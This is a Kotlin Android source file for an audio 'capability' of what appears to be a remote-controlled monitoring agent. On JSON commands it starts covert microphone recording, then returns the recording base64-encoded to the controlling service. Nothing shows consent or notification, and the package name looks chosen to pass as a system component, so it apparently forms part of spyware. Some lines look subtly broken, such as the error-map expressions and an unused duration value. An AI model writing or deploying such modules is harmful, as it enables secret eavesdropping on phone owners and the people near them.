package com.system.monitor.capabilities

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File
import java.io.FileInputStream
import java.util.concurrent.TimeUnit

class AudioCapability(private val service: AgentService) : AgentService.Capability {

    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "start" -> startRecording(params.duration ?: 30)
            "stop" -> stopRecording()
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {
        stopRecording()
    }

    private fun startRecording(duration: Int): Map<String, Any> {
        if (mediaRecorder != null) {
            return mapOf("error" to "already_recording")
        }
        try {
            recordingFile = File(service.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "audio_${System.currentTimeMillis()}.3gp")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setOutputFile(recordingFile!!.absolutePath)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                prepare()
                start()
            }
            mapOf("status" to "recording_started", "file" to recordingFile!!.absolutePath)
        } catch (e: Exception) {
            mapOf("error" to e.message ?: "recording_failed")
        }
    }

    private fun stopRecording(): Map<String, Any> {
        mediaRecorder?.run {
            try {
                stop()
                release()
            } catch (e: Exception) {
                return@run mapOf("error" to e.message ?: "stop_failed")
            }
            mediaRecorder = null
        }
        val file = recordingFile
        recordingFile = null
        return if (file != null && file.exists()) {
            val bytes = file.readBytes()
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            mapOf("status" to "recording_stopped", "audio" to base64, "size" to bytes.size)
        } else {
            mapOf("status" to "recording_stopped", "audio" to "")
        }
    }

    data class Params(val action: String, val duration: Int? = null)
}